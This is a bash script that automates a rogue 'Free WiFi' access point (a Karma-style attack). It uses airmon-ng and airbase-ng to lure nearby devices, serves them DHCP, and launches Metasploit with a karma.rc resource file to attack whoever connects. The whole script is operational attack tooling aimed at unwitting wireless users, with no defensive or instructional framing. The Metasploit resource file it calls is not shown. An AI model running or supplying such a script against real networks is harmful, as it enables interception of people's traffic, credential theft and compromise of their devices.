#!/bin/bash
wlan=$1 ## wlan0 normally but is specified on the cmdline as the first and only arg
mon="mon0" ## change this if aircrack-ng changes the default name of the monitor interface

echo "Starting monitor interface"
airmon-ng start $wlan

sleep 5 # give the last guy some time to finish up
echo "Starting airbase-ng"
airbase-ng -P -C 30 -e "Free WiFi" -v $mon 2>&1>airbase.log &

sleep 5 # give the last guy some time to finish up
echo "Configuring capture interface"
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0

echo "Starting dhcpd"
dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0

echo "Now the phun stuff!!"
/home/hax/.msf/msfconsole -r /usr/local/share/msf/resources/karma.rc

echo "Killing monitor interface"
airmon-ng stop $mon

echo "Killing airbase-ng"
killall airbase-ng

echo "killing dhcpd"
killall dhcpd3

exit 0
